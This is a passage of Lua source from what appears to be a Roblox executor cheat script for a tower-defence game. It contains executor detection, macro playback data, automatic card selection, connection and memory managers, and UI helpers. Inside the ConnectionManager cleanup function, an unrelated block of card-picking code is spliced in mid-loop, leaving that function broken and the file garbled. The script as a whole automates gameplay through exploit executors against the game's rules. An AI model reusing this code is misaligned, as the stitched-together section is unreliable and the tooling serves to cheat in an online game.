        local recoverySuccess = getgenv()._RestartRecovery_attemptRecovery("initial_load_timeout")
        
        if not recoverySuccess then
            warn("[ALS] Recovery failed, script may not work properly")
        end
    end
    
    if LocalPlayer.Character then
        warn("[ALS] Character loaded successfully, verifying game state...")
        
        local stateValid, timeTaken = getgenv()._StateVerification_waitForValidState(10)
        
        if stateValid then
            warn(string.format("[ALS] Initial load complete and verified (%.2fs)", timeTaken))
        end
    end
    
    task.wait(1)
end)

task.spawn(function()
    while true do
        task.wait(5)
        
        local isLoading, reason = getgenv()._LoadingScreenMonitor_isPlayerLoading()
        
        if isLoading then
            warn("[LoadingScreenMonitor] Detected loading state during gameplay: " .. (reason or "Unknown"))
            
            getgenv()._LoadingScreenMonitor_startMonitoring()
            
            local maxWait = 45
            local waited = 0
            
            while waited < maxWait do
                task.wait(2)
                waited = waited + 2
                
                local stillLoading = getgenv()._LoadingScreenMonitor_isPlayerLoading()
                if not stillLoading then
                    warn("[LoadingScreenMonitor] Loading completed after " .. waited .. "s")
                    getgenv()._LoadingScreenMonitor_stopMonitoring()
                    break
                end
                
                if waited >= 30 then
                    warn("[LoadingScreenMonitor] Loading screen stuck for " .. waited .. "s, attempting recovery...")
                    getgenv()._LoadingScreenMonitor_stopMonitoring()
                    getgenv()._RestartRecovery_attemptRecovery("loading_screen_stuck_during_gameplay")
                    break
                end
            end
        end
    end
end)

getgenv()._safeGetConnections = function(signal)
    if not getconnections then
        return {}
    end
    local success, result = pcall(function()
        return getconnections(signal)
    end)
    if success and result then
        return result
    end
    return {}
end

local PlatformDetector = {
    executor = "Unknown",
    isMobile = false,
    capabilities = {
        hasFileSystem = false,
        hasHTTP = false,
        hasVirtualInput = false,
        hasClipboard = false,
        hasConnectionIntrospection = false
    },
    detected = false
}

function PlatformDetector:detect()
    if self.detected then
        return self
    end
    
    ErrorHandler:wrapAsync(function()
        if identifyexecutor then
            self.executor = identifyexecutor() or "Unknown"
        elseif KRNL_LOADED then
            self.executor = "KRNL"
        elseif syn then
            self.executor = "Synapse X"
        elseif SENTINEL_V2 then
            self.executor = "Sentinel"
        elseif getexecutorname then
            self.executor = getexecutorname() or "Unknown"
        end
    end, "Executor detection")
    
    ErrorHandler:wrapAsync(function()
        local UserInputService = game:GetService("UserInputService")
        self.isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    end, "Mobile detection")
    
    ErrorHandler:wrapAsync(function()
        if isfolder and makefolder and isfile and readfile and writefile then
            self.capabilities.hasFileSystem = true
        end
    end, "File system capability check")
    
    ErrorHandler:wrapAsync(function()
        if game.HttpGet then
            self.capabilities.hasHTTP = true
        end
    end, "HTTP capability check")
    
    ErrorHandler:wrapAsync(function()
        local VirtualInputManager = game:GetService("VirtualInputManager")
        if VirtualInputManager then
            self.capabilities.hasVirtualInput = true
        end
    end, "VirtualInput capability check")
    
    ErrorHandler:wrapAsync(function()
        if setclipboard then
            self.capabilities.hasClipboard = true
        end
    end, "Clipboard capability check")
    
    ErrorHandler:wrapAsync(function()
        if getconnections then
            self.capabilities.hasConnectionIntrospection = true
        end
    end, "Connection introspection capability check")
    
    self.detected = true
    
    ErrorHandler:log("INFO", string.format("Platform detected: %s | Mobile: %s", 
        self.executor, 
        tostring(self.isMobile)))
    ErrorHandler:log("DEBUG", "Capabilities: " .. game:GetService("HttpService"):JSONEncode(self.capabilities))
    
    return self
end

function PlatformDetector:hasCapability(feature)
    if not self.detected then
        self:detect()
    end
    return self.capabilities[feature] == true
end

function PlatformDetector:getExecutor()
    if not self.detected then
        self:detect()
    end
    return self.executor
end

function PlatformDetector:isMobilePlatform()
    if not self.detected then
        self:detect()
    end
    return self.isMobile
end

function PlatformDetector:getCapabilityReport()
    if not self.detected then
        self:detect()
    end
    
    local report = "\n=== Platform Capabilities ===\n"
    report = report .. string.format("Executor: %s\n", self.executor)
    report = report .. string.format("Mobile: %s\n", tostring(self.isMobile))
    report = report .. "\nCapabilities:\n"
    
    for capability, available in pairs(self.capabilities) do
        local status = available and "✓" or "✗"
        report = report .. string.format("  %s %s\n", status, capability)
    end
    
    report = report .. "============================\n"
    return report
end

PlatformDetector:detect()

local MobileOptimizer = {
    isMobile = false,
    pollingInterval = 0.5, 
    maxConcurrentOperations = 10,
    activeOperations = 0,
    initialized = false
}

function MobileOptimizer:init()
    if self.initialized then
        return self
    end
    
    self.isMobile = PlatformDetector:isMobilePlatform()
    
    if self.isMobile then
        self.pollingInterval = 1.0 
        
        self.maxConcurrentOperations = 3
    else
        self.pollingInterval = 0.5
        self.maxConcurrentOperations = 10
    end
    
    self.initialized = true
    return self
end

function MobileOptimizer:getPollingInterval(baseInterval)
    if not self.initialized then
        self:init()
    end
    
    if self.isMobile then
        return baseInterval * 2 
    end
    
    return baseInterval
end

function MobileOptimizer:canStartOperation()
    if not self.initialized then
        self:init()
    end
    
    return self.activeOperations < self.maxConcurrentOperations
end

function MobileOptimizer:startOperation()
    if not self.initialized then
        self:init()
    end
    
    if self.activeOperations >= self.maxConcurrentOperations then
        ErrorHandler:log("WARN", string.format("Max concurrent operations reached (%d/%d)", 
            self.activeOperations, self.maxConcurrentOperations))
        return false
    end
    
    self.activeOperations = self.activeOperations + 1
    ErrorHandler:log("DEBUG", string.format("Operation started (%d/%d active)", 
        self.activeOperations, self.maxConcurrentOperations))
    return true
end

function MobileOptimizer:endOperation()
    if not self.initialized then
        self:init()
    end
    
    if self.activeOperations > 0 then
        self.activeOperations = self.activeOperations - 1
        ErrorHandler:log("DEBUG", string.format("Operation ended (%d/%d active)", 
            self.activeOperations, self.maxConcurrentOperations))
    end
end

function MobileOptimizer:wrapOperation(func)
    if not self.initialized then
        self:init()
    end
    
    return function(...)
        while not self:canStartOperation() do
            task.wait(0.1)
        end
        
        self:startOperation()
        
        local success, result = pcall(func, ...)
        
        self:endOperation()
        
        if not success then
            ErrorHandler:log("ERROR", "Operation failed: " .. tostring(result))
            return nil
        end
        
        return result
    end
end

function MobileOptimizer:getStats()
    if not self.initialized then
        self:init()
    end
    
    return {
        isMobile = self.isMobile,
        pollingInterval = self.pollingInterval,
        maxConcurrentOperations = self.maxConcurrentOperations,
        activeOperations = self.activeOperations
    }
end

MobileOptimizer:init()

local GameStateDetector = {
    isInLobby = nil,
    isInGame = false,
    gameStarted = false,
    detected = false,
    initializationTimeout = 3, 
    retryAttempts = 3,
    retryDelay = 0.5,
    pendingInitializations = {},
    gameStateChangeCallbacks = {}
}

function GameStateDetector:detect()
    if self.detected then
        return self
    end
    
    local detectionStartTime = tick()
    
    ErrorHandler:wrapAsync(function()
        local workspace = game:GetService("Workspace")
        local MarketplaceService = game:GetService("MarketplaceService")
        
        local hasLobbyFolder = workspace:FindFirstChild("Lobby") ~= nil
        
        local placeName = ""
        pcall(function()
            placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name or ""
        end)
        local placeNameHasLobby = placeName:lower():find("lobby") ~= nil
        
        local hasMap = workspace:FindFirstChild("Map") ~= nil
        local hasTowers = workspace:FindFirstChild("Towers") ~= nil
        local hasEnemies = workspace:FindFirstChild("Enemies") ~= nil
        
        if hasLobbyFolder or placeNameHasLobby then
            self.isInLobby = true
            self.isInGame = false
        elseif hasMap or hasTowers or hasEnemies then
            self.isInLobby = false
            self.isInGame = true
        else
            self.isInLobby = true
            self.isInGame = false
        end
        
        ErrorHandler:log("INFO", string.format("Game state detected: %s (took %.2fs)", 
            self.isInLobby and "Lobby" or "In-Game",
            tick() - detectionStartTime))
        
        if hasMap or hasTowers or hasEnemies then
            ErrorHandler:log("DEBUG", string.format("Game indicators: Map=%s, Towers=%s, Enemies=%s", 
                tostring(hasMap), tostring(hasTowers), tostring(hasEnemies)))
        end
    end, "Game state detection")
    
    self.detected = true
    return self
end

function GameStateDetector:isLobby()
    if not self.detected then
        self:detect()
    end
    return self.isInLobby == true
end

function GameStateDetector:isGame()
    if not self.detected then
        self:detect()
    end
    return self.isInGame == true
end

function GameStateDetector:waitForGameStart(timeout)
    timeout = timeout or self.initializationTimeout
    local startTime = tick()
    
    ErrorHandler:log("INFO", "Waiting for game to start...")
    
    while (tick() - startTime) < timeout do
        local success, hasStarted = pcall(function()
            local workspace = game:GetService("Workspace")
            local RS = game:GetService("ReplicatedStorage")
            
            local hasTowers = workspace:FindFirstChild("Towers") ~= nil
            local hasMap = workspace:FindFirstChild("Map") ~= nil
            local hasGamemode = RS:FindFirstChild("Gamemode") ~= nil
            
            return hasTowers or hasMap or hasGamemode
        end)
        
        if success and hasStarted then
            self.gameStarted = true
            self.isInGame = true
            self.isInLobby = false
            ErrorHandler:log("INFO", string.format("Game started (detected in %.2fs)", tick() - startTime))
            
            self:triggerGameStateCallbacks("gameStarted")
            
            return true
        end
        
        task.wait(0.1)
    end
    
    ErrorHandler:log("WARN", string.format("Game start detection timed out after %.1fs", timeout))
    return false
end

function GameStateDetector:registerInitialization(name, initFunc, options)
    options = options or {}
    
    local initialization = {
        name = name,
        func = initFunc,
        requiresGame = options.requiresGame or false,
        retryOnFailure = options.retryOnFailure ~= false, 
        timeout = options.timeout or self.initializationTimeout,
        initialized = false,
        attempts = 0
    }
    
    table.insert(self.pendingInitializations, initialization)
    
    ErrorHandler:log("DEBUG", string.format("Registered initialization: %s (requiresGame: %s)", 
        name, tostring(initialization.requiresGame)))
    
    return initialization
end

function GameStateDetector:initializeWithRetry(initialization)
    if initialization.initialized then
        return true
    end
    
    local maxAttempts = initialization.retryOnFailure and self.retryAttempts or 1
    
    for attempt = 1, maxAttempts do
        initialization.attempts = attempt
        
        if attempt > 1 then
            ErrorHandler:log("INFO", string.format("Retrying initialization: %s (attempt %d/%d)", 
                initialization.name, attempt, maxAttempts))
            task.wait(self.retryDelay)
        end
        
        local startTime = tick()
        local success, result = ErrorHandler:wrapAsync(function()
            return initialization.func()
        end, string.format("Initialize %s", initialization.name))
        
        local duration = tick() - startTime
        
        if success then
            initialization.initialized = true
            ErrorHandler:log("INFO", string.format("✓ Initialized: %s (%.2fs, attempt %d)", 
                initialization.name, duration, attempt))
            return true
        else
            ErrorHandler:log("WARN", string.format("✗ Failed to initialize: %s (%.2fs, attempt %d): %s", 
                initialization.name, duration, attempt, tostring(result)))
            
            if duration >= initialization.timeout then
                ErrorHandler:log("ERROR", string.format("Initialization timeout: %s", initialization.name))
                break
            end
        end
    end
    
    ErrorHandler:log("ERROR", string.format("Failed to initialize after %d attempts: %s", 
        maxAttempts, initialization.name))
    
    return false
end

function GameStateDetector:runPendingInitializations()
    if #self.pendingInitializations == 0 then
        return
    end
    
    ErrorHandler:log("INFO", string.format("Running %d pending initializations...", #self.pendingInitializations))
    
    local immediateInits = {}
    local delayedInits = {}
    
    for _, init in ipairs(self.pendingInitializations) do
        if init.requiresGame then
            table.insert(delayedInits, init)
        else
            table.insert(immediateInits, init)
        end
    end
    
    for _, init in ipairs(immediateInits) do
        self:initializeWithRetry(init)
    end
    
    if #delayedInits > 0 then
        if self:isLobby() then
            ErrorHandler:log("INFO", string.format("Delaying %d game-dependent initializations until game starts", 
                #delayedInits))
            
            task.spawn(function()
                if self:waitForGameStart() then
                    ErrorHandler:log("INFO", "Running delayed initializations...")
                    for _, init in ipairs(delayedInits) do
                        self:initializeWithRetry(init)
                    end
                else
                    ErrorHandler:log("WARN", "Game did not start in time, running delayed initializations anyway")
                    for _, init in ipairs(delayedInits) do
                        self:initializeWithRetry(init)
                    end
                end
            end)
        else
            for _, init in ipairs(delayedInits) do
                self:initializeWithRetry(init)
            end
        end
    end
end

function GameStateDetector:registerGameStateCallback(event, callback)
    if not self.gameStateChangeCallbacks[event] then
        self.gameStateChangeCallbacks[event] = {}
    end
    
    table.insert(self.gameStateChangeCallbacks[event], callback)
    
    ErrorHandler:log("DEBUG", string.format("Registered callback for event: %s", event))
end

function GameStateDetector:triggerGameStateCallbacks(event)
    if not self.gameStateChangeCallbacks[event] then
        return
    end
    
    ErrorHandler:log("DEBUG", string.format("Triggering %d callbacks for event: %s", 
        #self.gameStateChangeCallbacks[event], event))
    
    for _, callback in ipairs(self.gameStateChangeCallbacks[event]) do
        pcall(callback)
    end
end

function GameStateDetector:getReport()
    local report = "\n=== Game State Report ===\n"
    report = report .. string.format("State: %s\n", self.isInLobby and "Lobby" or (self.isInGame and "In-Game" or "Unknown"))
    report = report .. string.format("Game Started: %s\n", tostring(self.gameStarted))
    report = report .. string.format("Detected: %s\n", tostring(self.detected))
    
    report = report .. "\n=== Pending Initializations ===\n"
    report = report .. string.format("Total: %d\n", #self.pendingInitializations)
    
    local initialized = 0
    local failed = 0
    for _, init in ipairs(self.pendingInitializations) do
        if init.initialized then
            initialized = initialized + 1
        elseif init.attempts > 0 then
            failed = failed + 1
        end
    end
    
    report = report .. string.format("Initialized: %d\n", initialized)
    report = report .. string.format("Failed: %d\n", failed)
    report = report .. string.format("Pending: %d\n", #self.pendingInitializations - initialized - failed)
    
    report = report .. "========================\n"
    return report
end

GameStateDetector:detect()

local ConnectionManager = {
    connections = {},     
    groups = {},        
    towerConnections = {}, 
    nextId = 1,        
    cleanupInterval = 10, 
    stats = {
        totalTracked = 0,
        totalCleaned = 0,
        lastCleanup = tick()
    }
}

function ConnectionManager:track(connection, options)
    if not connection then
        ErrorHandler:log("WARN", "Attempted to track nil connection")
        return nil
    end
    
    options = options or {}
    local id = self.nextId
    self.nextId = self.nextId + 1
    
    local entry = {
        id = id,
        connection = connection,
        group = options.group,
        tower = options.tower,
        createdAt = tick(),
        context = options.context or "Unknown"
    }
    
    self.connections[id] = entry
    self.stats.totalTracked = self.stats.totalTracked + 1
    
    if options.group then
        if not self.groups[options.group] then
            self.groups[options.group] = {}
        end
        table.insert(self.groups[options.group], id)
    end
    
    if options.tower then
        if not self.towerConnections[options.tower] then
            self.towerConnections[options.tower] = {}
        end
        table.insert(self.towerConnections[options.tower], id)
    end
    
    ErrorHandler:log("DEBUG", string.format("Tracked connection #%d: %s", id, entry.context))
    
    return connection
end

function ConnectionManager:trackTower(tower, connection, context)
    if not tower or not connection then
        ErrorHandler:log("WARN", "Invalid tower or connection in trackTower")
        return nil
    end
    
    return self:track(connection, {
        tower = tower,
        context = context or ("Tower: " .. tostring(tower.Name))
    })
end

function ConnectionManager:trackGroup(groupName, connection, context)
    if not groupName or not connection then
        ErrorHandler:log("WARN", "Invalid group or connection in trackGroup")
        return nil
    end
    
    return self:track(connection, {
        group = groupName,
        context = context or ("Group: " .. groupName)
    })
end

function ConnectionManager:disconnectGroup(groupName)
    if not self.groups[groupName] then
        ErrorHandler:log("DEBUG", "Group not found: " .. tostring(groupName))
        return 0
    end
    
    local disconnected = 0
    for _, id in ipairs(self.groups[groupName]) do
        if self.connections[id] then
            pcall(function()
                if self.connections[id].connection then
                    self.connections[id].connection:Disconnect()
                end
            end)
            self.connections[id] = nil
            disconnected = disconnected + 1
        end
    end
    
    self.groups[groupName] = nil
    ErrorHandler:log("INFO", string.format("Disconnected group '%s': %d connections", groupName, disconnected))
    
    return disconnected
end

function ConnectionManager:disconnectTower(tower)
    if not tower or not self.towerConnections[tower] then
        return 0
    end
    
    local disconnected = 0
    for _, id in ipairs(self.towerConnections[tower]) do
        if self.connections[id] then
            pcall(function()
                if self.connections[id].connection then
                    self.connections[id].connection:Disconnect()
                end
            end)
            self.connections[id] = nil
            disconnected = disconnected + 1
        end
    end
    
    self.towerConnections[tower] = nil
    ErrorHandler:log("DEBUG", string.format("Disconnected tower connections: %d", disconnected))
    
    return disconnected
end

function ConnectionManager:cleanup()
    local cleaned = 0
    local now = tick()
    
    for id, entry in pairs(self.connections) do
                    if not getgenv()._FirstMatchCard then
                        getgenv()._FirstMatchCard = function(list, predicate)
                            local idx = 1
                            while list and idx <= #list do
                                local b = list[idx]
                                if predicate(b) then return b end
                                idx = idx + 1
                            end
                            return nil
                        end
                    end
                    local targetBtn = getgenv()._FirstMatchCard(buttons, function(b)
                        local nm = getCardName(b)
                        return nm and nm:find("Light Sacrifice") ~= nil
                    end)
                    if targetBtn and clickButton(targetBtn) then
                        isWaitingForPrompt = false
                        getgenv().GriffithLightUsedThisRound = true
                        cashAboveThresholdStart = 0
                        Window:Notify({
                            Title = "Griffith Light",
                            Description = "Selected Light Sacrifice",
                            Lifetime = 2
                        })
                        return
                    end
        local validIds = {}
        for _, id in ipairs(ids) do
            if self.connections[id] then
                table.insert(validIds, id)
            end
        end
        
        if #validIds == 0 then
            self.towerConnections[tower] = nil
        else
            self.towerConnections[tower] = validIds
        end
    end
    
    for groupName, ids in pairs(self.groups) do
        local validIds = {}
        for _, id in ipairs(ids) do
            if self.connections[id] then
                table.insert(validIds, id)
            end
        end
        
        if #validIds == 0 then
            self.groups[groupName] = nil
        else
            self.groups[groupName] = validIds
        end
    end
    
    self.stats.totalCleaned = self.stats.totalCleaned + cleaned
    self.stats.lastCleanup = now
    
    if cleaned > 0 then
        ErrorHandler:log("DEBUG", string.format("Cleaned up %d dead connections", cleaned))
    end
    
    return cleaned
end

function ConnectionManager:getStats()
    local activeConnections = 0
    for _ in pairs(self.connections) do
        activeConnections = activeConnections + 1
    end
    
    local activeTowers = 0
    for _ in pairs(self.towerConnections) do
        activeTowers = activeTowers + 1
    end
    
    local activeGroups = 0
    for _ in pairs(self.groups) do
        activeGroups = activeGroups + 1
    end
    
    return {
        active = activeConnections,
        towers = activeTowers,
        groups = activeGroups,
        totalTracked = self.stats.totalTracked,
        totalCleaned = self.stats.totalCleaned,
        lastCleanup = self.stats.lastCleanup
    }
end

function ConnectionManager:disconnectAll()
    local disconnected = 0
    
    for id, entry in pairs(self.connections) do
        pcall(function()
            if entry.connection then
                entry.connection:Disconnect()
            end
        end)
        disconnected = disconnected + 1
    end
    
    self.connections = {}
    self.groups = {}
    self.towerConnections = {}
    
    ErrorHandler:log("INFO", string.format("Disconnected all connections: %d total", disconnected))
    
    return disconnected
end

function ConnectionManager:startAutoCleanup()
    task.spawn(function()
        while true do
            task.wait(self.cleanupInterval)
            pcall(function()
                self:cleanup()
            end)
        end
    end)
end

local MemoryManager = {
    baseline = 0,
    baselineSet = false,
    lastCleanup = tick(),
    cleanupInterval = 10, 
    limits = {
        cashHistory = 5,
        macroData = 500,
        macroActions = 200,
        webhookHashes = 3,
        smartCardPicked = 3,
        slowerCardPicked = 3
    },
    stats = {
        totalCleanups = 0,
        lastCleanupTime = 0,
        itemsCleaned = 0
    }
}

function MemoryManager:getMemoryUsageMB()
    local stats = game:GetService("Stats")
    local memoryMB = 0
    pcall(function()
        memoryMB = stats:GetTotalMemoryUsageMb()
    end)
    if memoryMB == 0 then
        pcall(function()
            memoryMB = stats.MemoryUsageMb
        end)
    end
    return memoryMB
end

function MemoryManager:setBaseline()
    if self.baselineSet then
        return self.baseline
    end
    
    pcall(function() collectgarbage("collect") end)
    task.wait(0.1)
    
    self.baseline = self:getMemoryUsageMB()
    self.baselineSet = true
    
    ErrorHandler:log("INFO", string.format("Memory baseline set: %.1f MB", self.baseline))
    
    return self.baseline
end

function MemoryManager:enforceLimit(dataStructure, limit, keepRecent)
    if not dataStructure or type(dataStructure) ~= "table" then
        return 0
    end
    
    local currentSize = #dataStructure
    if currentSize <= limit then
        return 0
    end
    
    local itemsToRemove = currentSize - limit
    
    if keepRecent then
        local temp = {}
        local startIdx = math.max(1, currentSize - limit + 1)
        for i = startIdx, currentSize do
            table.insert(temp, dataStructure[i])
        end
        
        for i = currentSize, 1, -1 do
            dataStructure[i] = nil
        end
        for i, item in ipairs(temp) do
            dataStructure[i] = item
        end
    else
        for i = 1, itemsToRemove do
            table.remove(dataStructure, 1)
        end
    end
    
    return itemsToRemove
end

function MemoryManager:trimMacroCashHistory()
    if not getgenv().MacroCashHistory or type(getgenv().MacroCashHistory) ~= "table" then
        return 0
    end
    
    local currentSize = #getgenv().MacroCashHistory
    if currentSize <= self.limits.cashHistory then
        return 0
    end
    
    local temp = {}
    for i = 1, self.limits.cashHistory do
        temp[i] = getgenv().MacroCashHistory[i]
    end
    getgenv().MacroCashHistory = temp
    
    local removed = currentSize - self.limits.cashHistory
    ErrorHandler:log("DEBUG", string.format("Trimmed MacroCashHistory: %d -> %d entries", currentSize, self.limits.cashHistory))
    
    return removed
end

function MemoryManager:trimMacroDataV2()
    if not getgenv().MacroDataV2 or type(getgenv().MacroDataV2) ~= "table" then
        return 0
    end
    
    if getgenv().MacroRecordingV2 then
        return 0
    end
    
    local currentSize = #getgenv().MacroDataV2
    if currentSize <= self.limits.macroData then
        return 0
    end
    
    local temp = {}
    local startIdx = math.max(1, currentSize - (self.limits.macroData / 2))
    for i = startIdx, currentSize do
        table.insert(temp, getgenv().MacroDataV2[i])
    end
    getgenv().MacroDataV2 = temp
    
    local removed = currentSize - #temp
    ErrorHandler:log("DEBUG", string.format("Trimmed MacroDataV2: %d -> %d steps", currentSize, #temp))
    
    return removed
end

function MemoryManager:trimMacroActionsV2()
    if not getgenv().MacroActionsV2 or type(getgenv().MacroActionsV2) ~= "table" then
        return 0
    end
    
    if getgenv().MacroRecordingV2 then
        return 0
    end
    
    local currentSize = #getgenv().MacroActionsV2
    if currentSize <= self.limits.macroActions then
        return 0
    end
    
    local temp = {}
    local startIdx = math.max(1, currentSize - (self.limits.macroActions / 2))
    for i = startIdx, currentSize do
        table.insert(temp, getgenv().MacroActionsV2[i])
    end
    getgenv().MacroActionsV2 = temp
    
    local removed = currentSize - #temp
    ErrorHandler:log("DEBUG", string.format("Trimmed MacroActionsV2: %d -> %d actions", currentSize, #temp))
    
    return removed
end

function MemoryManager:trimWebhookHashList()
    if not getgenv()._lastWebhookHashList or type(getgenv()._lastWebhookHashList) ~= "table" then
        return 0
    end
    
    local currentSize = #getgenv()._lastWebhookHashList
    if currentSize <= self.limits.webhookHashes then
        return 0
    end
    
    local removed = 0
    while #getgenv()._lastWebhookHashList > self.limits.webhookHashes do
        table.remove(getgenv()._lastWebhookHashList, 1)
        removed = removed + 1
    end
    
    ErrorHandler:log("DEBUG", string.format("Trimmed webhook hash list: %d -> %d entries", currentSize, self.limits.webhookHashes))
    
    return removed
end

function MemoryManager:trimSmartCardPicked()
    if not getgenv().SmartCardPicked or type(getgenv().SmartCardPicked) ~= "table" then
        return 0
    end
    
    local currentSize = #getgenv().SmartCardPicked
    if currentSize <= self.limits.smartCardPicked then
        return 0
    end
    
    getgenv().SmartCardPicked = {}
    
    ErrorHandler:log("DEBUG", string.format("Cleared SmartCardPicked: %d entries", currentSize))
    
    return currentSize
end

function MemoryManager:trimSlowerCardPicked()
    if not getgenv().SlowerCardPicked or type(getgenv().SlowerCardPicked) ~= "table" then
        return 0
    end
    
    local currentSize = #getgenv().SlowerCardPicked
    if currentSize <= self.limits.slowerCardPicked then
        return 0
    end
    
    getgenv().SlowerCardPicked = {}
    
    ErrorHandler:log("DEBUG", string.format("Cleared SlowerCardPicked: %d entries", currentSize))
    
    return currentSize
end

function MemoryManager:cleanWukongTrackedClones()
    if not getgenv().WukongTrackedClones or type(getgenv().WukongTrackedClones) ~= "table" then
        return 0
    end
    
    local removed = 0
    local toRemove = {}
    
    for cloneId, _ in pairs(getgenv().WukongTrackedClones) do
        if type(cloneId) ~= "string" then
            table.insert(toRemove, cloneId)
        end
    end
    
    for _, key in ipairs(toRemove) do
        getgenv().WukongTrackedClones[key] = nil
        removed = removed + 1
    end
    
    if removed > 0 then
        ErrorHandler:log("DEBUG", string.format("Cleaned WukongTrackedClones: %d invalid entries", removed))
    end
    
    return removed
end

function MemoryManager:cleanTowerTrackerPendingActions()
    if not getgenv()._TowerTrackerPendingActions or type(getgenv()._TowerTrackerPendingActions) ~= "table" then
        return 0
    end
    
    local removed = 0
    local now = tick()
    local staleThreshold = 30 
    
    for key, timestamp in pairs(getgenv()._TowerTrackerPendingActions) do
        if type(timestamp) == "number" and (now - timestamp) > staleThreshold then
            getgenv()._TowerTrackerPendingActions[key] = nil
            removed = removed + 1
        end
    end
    
    if removed > 0 then
        ErrorHandler:log("DEBUG", string.format("Cleaned TowerTrackerPendingActions: %d stale entries", removed))
    end
    
    return removed
end

function MemoryManager:cleanMacroPlaybackData()
    if not getgenv().MacroPlaybackActive and getgenv().MacroPlaybackMacroData then
        getgenv().MacroPlaybackMacroData = nil
        ErrorHandler:log("DEBUG", "Cleaned inactive MacroPlaybackMacroData")
        return 1
    end
    
    return 0
end

function MemoryManager:cleanup()
    local startTime = tick()
    local totalCleaned = 0
    
    totalCleaned = totalCleaned + self:trimMacroCashHistory()
    totalCleaned = totalCleaned + self:trimMacroDataV2()
    totalCleaned = totalCleaned + self:trimMacroActionsV2()
    totalCleaned = totalCleaned + self:trimWebhookHashList()
    totalCleaned = totalCleaned + self:trimSmartCardPicked()
    totalCleaned = totalCleaned + self:trimSlowerCardPicked()
    
    totalCleaned = totalCleaned + self:cleanWukongTrackedClones()
    totalCleaned = totalCleaned + self:cleanTowerTrackerPendingActions()
    totalCleaned = totalCleaned + self:cleanMacroPlaybackData()
    
    self.stats.totalCleanups = self.stats.totalCleanups + 1
    self.stats.lastCleanupTime = tick() - startTime
    self.stats.itemsCleaned = self.stats.itemsCleaned + totalCleaned
    self.lastCleanup = tick()
    
    if totalCleaned > 50 then
        pcall(function() collectgarbage("collect") end)
        ErrorHandler:log("DEBUG", string.format("Memory cleanup: %d items removed, GC triggered", totalCleaned))
    elseif totalCleaned > 0 then
        ErrorHandler:log("DEBUG", string.format("Memory cleanup: %d items removed", totalCleaned))
    end
    
    return totalCleaned
end

function MemoryManager:getReport()
    local report = "\n=== Memory Manager Report ===\n"
    
    local currentMem = self:getMemoryUsageMB()
    report = report .. string.format("Current Memory: %.1f MB\n", currentMem)
    
    if self.baselineSet then
        report = report .. string.format("Baseline Memory: %.1f MB\n", self.baseline)
        report = report .. string.format("Memory Growth: +%.1f MB\n", currentMem - self.baseline)
    end
    
    report = report .. "\n=== Data Structure Sizes ===\n"
    report = report .. string.format("MacroCashHistory: %d / %d\n", 
        getgenv().MacroCashHistory and #getgenv().MacroCashHistory or 0, 
        self.limits.cashHistory)
    report = report .. string.format("MacroDataV2: %d / %d\n", 
        getgenv().MacroDataV2 and #getgenv().MacroDataV2 or 0, 
        self.limits.macroData)
    report = report .. string.format("MacroActionsV2: %d / %d\n", 
        getgenv().MacroActionsV2 and #getgenv().MacroActionsV2 or 0, 
        self.limits.macroActions)
    report = report .. string.format("WebhookHashList: %d / %d\n", 
        getgenv()._lastWebhookHashList and #getgenv()._lastWebhookHashList or 0, 
        self.limits.webhookHashes)
    report = report .. string.format("SmartCardPicked: %d / %d\n", 
        getgenv().SmartCardPicked and #getgenv().SmartCardPicked or 0, 
        self.limits.smartCardPicked)
    report = report .. string.format("SlowerCardPicked: %d / %d\n", 
        getgenv().SlowerCardPicked and #getgenv().SlowerCardPicked or 0, 
        self.limits.slowerCardPicked)
    
    local wukongCount = 0
    if getgenv().WukongTrackedClones then
        for _ in pairs(getgenv().WukongTrackedClones) do
            wukongCount = wukongCount + 1
        end
    end
    report = report .. string.format("WukongTrackedClones: %d\n", wukongCount)
    
    local pendingCount = 0
    if getgenv()._TowerTrackerPendingActions then
        for _ in pairs(getgenv()._TowerTrackerPendingActions) do
            pendingCount = pendingCount + 1
        end
    end
    report = report .. string.format("TowerTrackerPendingActions: %d\n", pendingCount)
    
    report = report .. "\n=== Cleanup Statistics ===\n"
    report = report .. string.format("Total Cleanups: %d\n", self.stats.totalCleanups)
    report = report .. string.format("Items Cleaned: %d\n", self.stats.itemsCleaned)
    report = report .. string.format("Last Cleanup: %.3fs ago\n", tick() - self.lastCleanup)
    report = report .. string.format("Last Cleanup Time: %.3fs\n", self.stats.lastCleanupTime)
    
    report = report .. "============================\n"
    
    return report
end

function MemoryManager:startAutoCleanup()
    task.spawn(function()
        while true do
            task.wait(self.cleanupInterval)
            pcall(function()
                self:cleanup()
            end)
        end
    end)
end


local UIFactory = {
    config = nil,
    saveCallback = nil,
    initialized = false
}

function UIFactory:init(config, saveCallback)
    self.config = config
    self.saveCallback = saveCallback
    self.initialized = true
end

function UIFactory:createElement(elementType, section, options)
    if not self.initialized then
        ErrorHandler:log("ERROR", "UIFactory not initialized. Call UIFactory:init() first")
        return nil
    end
    
    if not section then
        ErrorHandler:log("ERROR", "Section is required for createElement")
        return nil
    end
    
    options = options or {}
    local name = tostring(options.name or elementType)
    local flag = options.flag
    local callback = options.callback
    local default = options.default
    local autoSave = options.autoSave ~= false 
    
    if elementType == "Toggle" then
        return self:_createToggle(section, name, flag, callback, default, autoSave)
    elseif elementType == "Input" then
        return self:_createInput(section, name, flag, options, autoSave)
    elseif elementType == "Dropdown" then
        return self:_createDropdown(section, name, flag, options, autoSave)
    elseif elementType == "Slider" then
        return self:_createSlider(section, name, flag, options, autoSave)
    elseif elementType == "Button" then
        return self:_createButton(section, name, flag, callback)
    elseif elementType == "Keybind" then
        return self:_createKeybind(section, name, flag, options, autoSave)
    elseif elementType == "Colorpicker" then
        return self:_createColorpicker(section, name, flag, options, autoSave)
    else
        ErrorHandler:log("ERROR", "Unknown element type: " .. tostring(elementType))
        return nil
    end
end

function UIFactory:_createToggle(section, name, flag, callback, default, autoSave)
    default = default or false
    
    local savedValue = default
    if autoSave and flag and self.config and self.config.toggles then
        local saved = self.config.toggles[flag]
        if saved ~= nil then
            savedValue = saved
        end
    end
    
    return ErrorHandler:wrap(function()
        return section:Toggle({
            Name = name,
            Default = savedValue,
            Callback = function(value)
                if autoSave and flag and self.config then
                    self.config.toggles[flag] = value
                    if self.saveCallback then
                        self.saveCallback(self.config)
                    end
                end
                
                if callback then
                    callback(value)
                end
            end,
        }, flag)
    end, "Create Toggle: " .. name)()
end

function UIFactory:_createInput(section, name, flag, options, autoSave)
    local placeholder = options.placeholder or ""
    local charType = options.charType or options.acceptedCharacters or "All"
    local default = options.default or ""
